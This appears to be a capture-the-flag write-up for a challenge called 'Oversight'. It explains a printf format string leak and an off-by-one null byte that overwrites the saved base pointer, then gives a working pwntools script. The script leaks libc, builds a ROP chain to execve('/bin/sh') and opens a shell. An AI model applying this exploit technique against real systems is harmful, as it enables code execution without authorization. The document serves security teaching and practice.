# Oversight Solution

This is a ropchain challenge with a base pointer overwrite.

## Running the program

When we run the program we are asked to pick a number, to which the program replies with a magic number. If we feed it a `0` then our magic number is `%0$llx` - this is a hint at a format string vulnerability.

Later the program asks for the number of bytes you want to write, then asks you to write that many bytes, before echoing them back at you.

## The first vulnerability

The format string vulnerability is worth looking into. Upon inspecting how it works, it is revealed to be parsing your input to an integer before interpolating it back into the format string. The prevents using `%n` etc. in the format string, but allows a random `%n$llx` to be used.

Once this format string is assembled it is simply being passed into printf without any further arguments. This allows a leak of arbitrary data out of one of the arugument registers or off the stack.

## The second vulnerability

When looking at the binary, one thing to note is that the function calls are oddly nested - instead of sequentially calling one function then the other, functions are nested to complete each other. This hints that the solution may be something to do with the function call stack.

The second thing to note is that there is a custom string operation written into the `echo_inner` function, which calls `fread` for the number of bytes you want, then appends a null byte after. This can be abused to fill the buffer with 256 bytes of  arbitrary data and then write a null byte into the next byte after the buffer.
It just so happens that the byte after the buffer here happens to be the saved base pointer for the `echo` function's frame. Now we are able to overwrite the saved base pointer, which will become `rbp` once the function is returned from, and then will control the stack pointer when the calling function is returned from.

```
┏━━━━━━━━━━━━━━━┓
┃ AAAAAAAAAAAAA ┃ <- buffer
┃ AAAAAAAAAAAAA ┃
┃ AAAAAAAAAAAAA ┃
┃ AAAAAAAAAAAAA ┃
┣━━━━━━━━━━━━━━━┫
┃ 00            ┃ <- saved RBP
┣━━━━━━━━━━━━━━━┫
┃               ┃ <- ret addr
┗━━━━━━━━━━━━━━━┛
```

We can utilize this to move the stack pointer for `get_num_bytes` just before it returns (during the `leave` instruction) back up the stack into the 256 byte buffer we filled before, then the following `ret` instruction begins a rop chain.

## The exploit

Our goal for this exploit is to use a ropchain to call `system("/bin/sh")` but to do that we must first know the location of libc.

To leak the libc location, we look at the stack where the `printf` call is made:

```
00:0000│ rsp     0x7fffffffe2d0 —▸ 0x7ffff7f87520 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0008│         0x7fffffffe2d8 ◂— 0xa36000001
02:0010│ rdi r12 0x7fffffffe2e0 ◂— 'Your magic number is: %6$llx\n'
03:0018│         0x7fffffffe2e8 ◂— 'ic number is: %6$llx\n'
04:0020│         0x7fffffffe2f0 ◂— 'r is: %6$llx\n'
05:0028│         0x7fffffffe2f8 ◂— 0xa786c6c24 /* '$llx\n' */
06:0030│         0x7fffffffe300 ◂— 0x0
07:0038│         0x7fffffffe308 —▸ 0x7ffff7e47a69 (__GI__IO_do_write+25) ◂— cmp    rbx, rax
08:0040│         0x7fffffffe310 ◂— 0xa /* '\n' */
09:0048│         0x7fffffffe318 —▸ 0x7ffff7e47ed3 (__GI__IO_file_overflow+259) ◂— cmp    eax, -1
0a:0050│         0x7fffffffe320 ◂— 0x10
0b:0058│         0x7fffffffe328 —▸ 0x7ffff7f87520 (_IO_2_1_stdout_) ◂— 0xfbad2887
0c:0060│         0x7fffffffe330 —▸ 0x555555556075 ◂— 'Lets play a game'
0d:0068│         0x7fffffffe338 —▸ 0x7ffff7e3cc2a (puts+378) ◂— cmp    eax, -1
0e:0070│         0x7fffffffe340 —▸ 0x555555555430 (__libc_csu_init) ◂— endbr64
0f:0078│         0x7fffffffe348 —▸ 0x7fffffffe370 ◂— 0x0
10:0080│         0x7fffffffe350 —▸ 0x5555555550e0 (_start) ◂— endbr64
11:0088│         0x7fffffffe358 —▸ 0x5555555550e0 (_start) ◂— endbr64
12:0090│ rbp     0x7fffffffe360 —▸ 0x7fffffffe370 ◂— 0x0
13:0098│         0x7fffffffe368 —▸ 0x5555555550d5 (main+37) ◂— xor    eax, eax
```

We can see at stack position 0x00 0x0b there is the `_IO_2_1_stdout_` symbol which exists within libc. For this example I have chosen to use offset 0x0b.

Since this is x86_64 we have 6 arguments in registers before the stack starts being used for `printf` arguments, therefore if we want to index into position 0x0b on the stack, we must add 6 to it and give 17.


```python
from pwn import *

p = process("./src/pwn")

p.sendline(b"")
p.readuntil(b"Pick a number: ")
p.sendline(b"17")
```

Now that we know the address of the `_IO_2_1_stdout_` symbol, we use that to calculate the base of libc, and find some gadgets to help with the ropchain.

```python
p.readuntil(b"Your magic number is: ")
leaked = int(p.readline().strip(), 16)

# 2.27
libc_base = leaked - 0x3ec760
libc_ret = libc_base + 0x000008aa
libc_pop_rsi = libc_base + 0x00023eea
libc_binsh = libc_base + 0x1b3e1a
libc_pop_rdi = libc_base + 0x000215bf
libc_execve = libc_base + 0xe4c00

print("_IO_2_1_stdout_ = {:x}".format(leaked))
print("libc_base = {:x}".format(libc_base))
```

Now we can send our ropchain - preceeded by a few `ret` gadgets to use as a sled for our shell.

```python
print("_IO_2_1_stdout_ = {:x}".format(leaked))
print("libc_base = {:x}".format(libc_base))

p.readuntil(b"How many bytes do you want to read (max 256)? ")
p.sendline(b"256")

ropchain = (
    p64(libc_pop_rsi) +
    p64(0) +  # rsi
    p64(libc_pop_rdi) +
    p64(libc_binsh) +  # /bin/sh
    p64(libc_execve)
)

payload = p64(libc_ret) * ((256 - len(ropchain)) // 8) + ropchain

p.send(payload)

p.interactive()
```

(this exploit may fail some of the time)
